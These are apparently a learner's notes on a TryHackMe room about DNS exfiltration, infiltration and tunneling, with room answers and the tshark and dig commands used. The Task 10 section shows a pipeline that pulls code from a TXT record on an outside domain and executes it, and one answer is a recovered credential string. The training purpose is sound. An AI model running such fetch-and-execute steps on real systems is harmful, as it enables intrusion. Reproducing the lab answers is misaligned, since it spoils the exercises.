# TryHackMe Notes: DNS Manipulation

## 📌 Room Overview
This room covers the concepts of DNS Manipulation, specifically focusing on how attackers use the Domain Name System (DNS) to bypass network security controls. It covers techniques like **DNS Exfiltration** (smuggling data out of a network), **DNS Infiltration** (pulling malicious code into a network), and **DNS Tunneling**.

---
What is DNS?
A refresher on DNS commands and record types.

If you were on Windows, what command could you use to query a txt record for 'youtube.com'?

nslookup -type=TXT youtube.com

If you were on Linux, what command could you use to query a txt record for 'facebook.com'?

dig facebook.com TXT

AAAA stores what type of IP Address along with the hostname?

IPv6

Maximum characters for a DNS TXT Record is 256.

Nay

What DNS Record provides a domain name in reverse-lookup?

PTR

What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2)

2.203.168.192.in-addr.arpa

Task 5: DNS Exfiltration
DNS Exfiltration involves taking sensitive data, encoding it, and appending it to DNS queries to sneak it past firewalls.

What is the maximum length of a DNS name?

253

Task 7: DNS Exfiltration - Practice
Scenario 1: ~/challenges/exfiltration/orderlist/

You can extract and analyze the DNS queries from the PCAP file using tshark:

Bash
tshark -r challenges/exfiltration/orderlist/order.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c
Use the provided python script to decode the exfiltrated packets:

Bash
python3 ~/dns-exfil-infil/packetyGrabber.py
cat order.txt
ORDER-ID: 1. What is the Transaction name?

Network Equip.

TRANSACTION: Firewall. How much was the Firewall?

2500

Scenario 2: ~/challenges/exfiltration/identify/

Find the file with suspicious queries (analyze cap1, cap2, cap3):

Bash
tshark -r challenges/exfiltration/identify/cap3.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c
Which file contains suspicious DNS queries?

cap3.pcap

Run packetyGrabber.py to extract the hidden data:

administrator:s3cre7P@ssword

Task 8: What is DNS Infiltration?
DNS Infiltration is the opposite of exfiltration. It is used to pull malicious commands or payloads down into a compromised machine by querying specific text records on a server controlled by the attacker.

What type of DNS Record is usually used to infiltrate data into a network?

TXT

Task 10: DNS Infiltration - Practice
Using the concepts of infiltration to pull and execute malicious python code hidden inside TXT records.

Steps to extract and execute:

Bash
# Extract the payload from the TXT record
dig code.badbaddoma.in TXT | egrep -o 'Ye[^"]*' > code.py

# Decode using the provided script
python3 dns-exfil-infil/packetySimple.py

# Execute the resulting payload
python3 code.py
Enter the output from the executed python file:

4.4.0-186-generic

Task 11: DNS Tunneling
DNS Tunneling wraps other protocols (like HTTP or SSH) inside DNS traffic to bypass captive portals or firewalls.

What program was used to Tunnel HTTP over DNS?

iodine

Task 12: The End
Tip: Always verify TXT records of suspicious domains during investigations (e.g., dig badbaddoma.in TXT).